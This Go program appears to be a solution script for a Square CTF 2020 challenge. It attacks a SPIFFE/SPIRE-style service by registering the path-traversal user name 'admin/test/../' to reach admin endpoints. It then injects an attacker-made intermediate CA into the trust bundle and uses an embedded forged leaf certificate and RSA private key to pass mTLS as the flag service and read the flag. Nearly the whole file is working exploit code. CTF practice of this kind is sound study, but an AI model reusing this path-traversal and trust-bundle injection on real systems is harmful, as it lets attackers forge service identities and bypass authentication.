package main

import (
	"bytes"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"time"

	"github.com/spiffe/go-spiffe/v2/bundle/x509bundle"
	"github.com/spiffe/go-spiffe/v2/spiffeid"
	"github.com/spiffe/go-spiffe/v2/spiffetls/tlsconfig"
	"github.com/spiffe/go-spiffe/v2/svid/x509svid"
)

const serverUrl = "http://challenges.2020.squarectf.com:9891"
const flagUrl = "https://challenges.2020.squarectf.com:9890/flag"

const intermediateCert = `
-----BEGIN CERTIFICATE-----
MIIEODCCAiCgAwIBAgIQSJ3WzCyRvqDlxRqW/NmTMjANBgkqhkiG9w0BAQsFADAN
MQswCQYDVQQDEwJDQTAeFw0yMDExMTMwNzE4NTdaFw0yMjA1MTMwNjQyNTFaMBcx
FTATBgNVBAMTDGludGVybWVkaWF0ZTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAOKpZPV+5PIQRrlBIFwSryD9H0Vq0+PUp3517qxeyGSiCf4mFctAsGo1
gmcQcO9+YjFLu7Mbb87jGPMMc20fYPDpsEmzR7GIBNfvtO1/GPMK50NxggxCGpld
VSnr+qp7/Se1NUiAhUUFr6ysD6FbkKWCt/pstC0fqcQ6zVUsB1d/yXjsFIrnbyYY
9FGS1P7LtxSqftCzVSTwZrUXVwhmu72iOsJLzOu3AiXCgU3sGixd9Ga3BGIsWQ+B
2MYL0HziGFWtCX/VAbuR55kK5A25GkPqMyibTF40SFM6UfQih1OrK2LzC/SRO7ub
0Bezpt0fjR5Y0PG3T44yammFpk+wzkECAwEAAaOBiTCBhjAOBgNVHQ8BAf8EBAMC
AQYwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUMReY7w9PKs2vrJ4l6Um6o3pP
RUowHwYDVR0jBBgwFoAUxUI2O2JbQyDU+0moVUJjZwfPtT8wIwYDVR0RBBwwGoYY
c3BpZmZlOi8vc3F1YXJlLmN0Zi5jaGFsMA0GCSqGSIb3DQEBCwUAA4ICAQCu1YJL
uDyBd0B8k20lJM7XYqCNlV8O50GH30ANJydE3TtGkmR+1ybd2xm/QWQOyk2TxzjM
bJyNc14U55hOfFwnZJZGsvbdMZxXJFMsREGA9rNm0moUClyB08bN5duDL0igGMH5
9QFpaMdFj90JP1DNRVOU0n8X7Rs2c9CW3nmb7og5pb7Bt1i993IhjXVIrxPT3mVp
RFdWJi0Ecv0zqWMrXKZ1SN4UihxxuA0/c0gF4urs9vkSonfQYJ4BaKJ7F9/Zgvq2
p94m375rG2QKjF6/tkDtZfjYC4ZHlgHKl3qHwYSLN+AUCjxDesK5bA9oQ/UVzsTk
kcjIlDsjhAlDF1jQpMo1DoNLif2uVzDJE1hC7OtF6W0VMJXigKXmxZWKDd9qS/rw
KDgZt+Sc2MiC1XkvhiadrKgdJMfgM/XS8sw74Tk8tmaKyp/gZI2O9DaiTcPIz1QI
eKxE2sNJvh+y0pwryVLeEWwbl3uVJWXHR3jXz7LAA40ZsIZVzrdOYThIbQSlqnvb
JWnlp9wwpSUOOnqk37BrFf7wJZQZSdLZ2rteEDY+BtmYI3WxLasEbvnBscaz2LmW
UE/dshV4vc8SC4ANgGtLRHwa0f76WwEVbu7DRKRrYmMTamQGthpvwSs7ST6+wu/c
juZcA74dppbsDlquXRp1nwgXEbExMWyvkHNI8w==
-----END CERTIFICATE-----`

const flagCert = `
-----BEGIN CERTIFICATE-----
MIIDTjCCAjagAwIBAgIRAOEnZdo+f19BZWL9NDL82mMwDQYJKoZIhvcNAQELBQAw
FzEVMBMGA1UEAxMMaW50ZXJtZWRpYXRlMB4XDTIwMTExMzA3MTkwN1oXDTIyMDUx
MzA2NDI1MFowDzENMAsGA1UEAxMEbGVhZjCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBANH7lZblDi/4AcDm58RxrEri3O7dYGyrKtwtxsnbdji8FZ61tuhn
7bz2Nzbe3IfQ0fL/QIjwZ0HmXPBy9NsfodtGNxKBlD86yYFzDNQTElXzpG4ge4SV
RfvkfUIWXyjLi9D4UxczNPF8kZ2y7/S/U2kOfxpGC7tL3TkCWnqHlCUS3jS7ugPX
FnwErKWO4HruMuzghuVMGloMVnPswxojtRinSVHybkw4KUTXVBt3P0z0k8GHBgGU
1h56kGsGhmdjrqANO9zXh3OUSkB1Spsa/WPt5dz9T/RfVXyka6qph7kjINXTyQ3m
Vvt7kbd810fvImmQdIhXOBjhG3ptfxEhowcCAwEAAaOBnDCBmTAOBgNVHQ8BAf8E
BAMCA7gwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMB0GA1UdDgQWBBSX
J1JOpk+7DE2hVOAvzHu4Qghk2jAfBgNVHSMEGDAWgBQxF5jvD08qza+sniXpSbqj
ek9FSjAoBgNVHREEITAfhh1zcGlmZmU6Ly9zcXVhcmUuY3RmLmNoYWwvZmxhZzAN
BgkqhkiG9w0BAQsFAAOCAQEAZK2blzmx78CfWvF0kp9s/SKTCisrIHlnFUjvPqZc
NkRm2JT1Y7vhNOaX3pe+dZTmZ4RukR2hX7VsW4Q+qOqovUQAOyQZw+aGleSiyNQ/
D8555DLNF0Cd87MXQkyL2tDEPCOL5dOSnPx21j11XnAKejbtPUSQB6ip3AurT9jr
M8IDu7tK5BCrlsZp5XvqVx2jnS1Ojgw0tI8nD1YXva78KFm4FXz97aE9Vx8PzdHE
5DDaUtEIak85OREA/9B4j2lp1dzljYNGbGiT0jxRCpVxEnCAAtGNVCphkYrsZ48Q
VejFJBZnEsbPucgtLEnaugHMN8Fhv1HBsGwxXi16EDUfSA==
-----END CERTIFICATE-----`

const flagKey = `
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0fuVluUOL/gBwObnxHGsSuLc7t1gbKsq3C3Gydt2OLwVnrW2
6GftvPY3Nt7ch9DR8v9AiPBnQeZc8HL02x+h20Y3EoGUPzrJgXMM1BMSVfOkbiB7
hJVF++R9QhZfKMuL0PhTFzM08XyRnbLv9L9TaQ5/GkYLu0vdOQJaeoeUJRLeNLu6
A9cWfASspY7geu4y7OCG5UwaWgxWc+zDGiO1GKdJUfJuTDgpRNdUG3c/TPSTwYcG
AZTWHnqQawaGZ2OuoA073NeHc5RKQHVKmxr9Y+3l3P1P9F9VfKRrqqmHuSMg1dPJ
DeZW+3uRt3zXR+8iaZB0iFc4GOEbem1/ESGjBwIDAQABAoIBAE3H931Rk5PJNj0S
Sz/FK6EBr/z7G8ClFtdATaZwGLajVQ7ZGMu106ZvPbyhiOb2Pw7X5jvTcSxD/KFE
s9aHPRlQRQ4h2ZwiVooQ5+uWtPAJtBrnBVnzQV0xIgTc7Jrb6wqZMY4idbYOApJ7
uc7bIDaGHCbLU4UpcOSxLnq8xe+FBen70DH2Ro3m4QLSC7GfGNUJCtak397mFC9l
xsZeVm/SJDP9YSfrnbwT4GdFw7AF7u/RxUB1uCt/YHOQ5Ht8nSLJr25VXqnpMOJs
mET2S24PTv6YUOyxFvIsjLHOD+4tQzRIQR/CgX5gmHpCZ0Oybpsi5mU1YQvk6Rnw
0sEA3sECgYEA6wm1HE/syEcz4HUgVdjq/rbgBJsS0NtrkXCASUUSsXxvL2OizOhA
AiIAJz2M6WygkKmU01wmOn6q0xuz8dtZNRE5mcqwY5nLL1Bwy14l07zinqJOzAfj
qGsCKMRfkcsFa3fXNB1Q7xpMBokgjxDUR+6ALBH5yc6T8bE1g/yg6E8CgYEA5LXT
w6XCJKfUZP7AeUy77vKIrCMqqm4oGQYEr7JW27nTE38wJqDfFF5XfI6MiNreobhQ
H/p7IRLuBsJWaxQbbN4ZKsf9PkOUGH6+kuDZJmaamaHH3xwVuhxacCK0vwHYLbyw
o981bfHIgZNlrCnXjK5sxWculeKkAS1hL1Lks8kCgYBe0qPGsFgO1OsQ+y/4cnMc
IBtwwD9vE5bqLkETTlKkWFdi/weHM4vfUGhPbH2VDsYYltH8E4k4wDGayepnAN+U
kUZzzVosVLesdv+KjIkmS2YCKekwV155a/KLD+6emxGsscSYudsVG77gRCJmlZuP
CaGcJgRobncxYxT8Ese38QKBgQDYJaNh5tjpbZeEb2KWANgoBhz2mjGranoI1DA/
oAsIk8ERTwXBrA3IITULaWkVucvoCNnorwAJDOvZhXbIsfMNW4VrciA65QEkeTxA
cbGn4hZAFa5ghBlgj4VFLvelAOg+qXJDHSNQqc218AiJwe2NbhcsJMzZKJ2Y4ztS
z0OHSQKBgAgBecimfy+rTLGuu58FFpojlKVc2jyLhSI3tLqNNKi9JBlFbnsPXHap
51geeCTx5FAyI+87h3DqmzfRikZ30lZhtGq3DMJ2i+tXyboAUzEG+DEADFsYIXiB
F5wKQONA39T0VHgPd8SWG4xS0wAKqkuRFsXH39eP5lp2MsdjFSpN
-----END RSA PRIVATE KEY-----`

var flagServiceSpiffeID = spiffeid.Must("square.ctf.chal", "flagService")

type FakeBundle struct {
	Bundle string
}

func (b *FakeBundle) GetX509BundleForTrustDomain(trustDomain spiffeid.TrustDomain) (*x509bundle.Bundle, error) {
	bundle := x509bundle.New(spiffeid.RequireTrustDomainFromString("square.ctf.chal"))
	block, _ := pem.Decode([]byte(b.Bundle))
	cert, _ := x509.ParseCertificate(block.Bytes)
	bundle.AddX509Authority(cert)

	return bundle, nil
}

type FakeX509Src struct{}

func (x *FakeX509Src) GetX509SVID() (*x509svid.SVID, error) {
	block, _ := pem.Decode([]byte(flagCert))
	cert, _ := x509.ParseCertificate(block.Bytes)

	block, _ = pem.Decode([]byte(flagKey))
	privKey, _ := x509.ParsePKCS1PrivateKey(block.Bytes)

	svid := &x509svid.SVID{
		ID:           spiffeid.Must("square.ctf.chal", "flag"),
		Certificates: []*x509.Certificate{cert},
		PrivateKey:   privKey,
	}

	return svid, nil
}

func main() {
	jar, _ := cookiejar.New(nil)
	client := &http.Client{Jar: jar}

	register := map[string]string{
		"user": "admin/test/../",
	}
	registerData, _ := json.Marshal(register)
	resp, err := client.Post(serverUrl+"/register", "application/json", bytes.NewBuffer(registerData))
	if err != nil {
		log.Println(err)
		return
	}

	var spireBundle []byte
	for string(spireBundle) == "" {
		time.Sleep(3 * time.Second)
		resp, err = client.Post(serverUrl+"/admin/bundle/show", "application/json", nil)
		if err != nil {
			log.Println(err)
			return
		}
		spireBundle, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Println(err)
			return
		}
		log.Println(string(spireBundle))
	}

	add := map[string]string{
		"bundle": intermediateCert,
	}
	addData, _ := json.Marshal(add)
	_, err = client.Post(serverUrl+"/admin/bundle/add", "application/json", bytes.NewBuffer(addData))
	if err != nil {
		log.Println(err)
		return
	}
	time.Sleep(3 * time.Second)

	bundleSrc := FakeBundle{Bundle: string(spireBundle)}
	x509Src := FakeX509Src{}

	flagClient := http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsconfig.MTLSClientConfig(&x509Src, &bundleSrc, tlsconfig.AuthorizeID(flagServiceSpiffeID)),
		},
	}

	resp, err = flagClient.Get(flagUrl)
	if err != nil {
		log.Println(err)
		return
	}

	flag, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
		return
	}
	log.Println(string(flag))
}
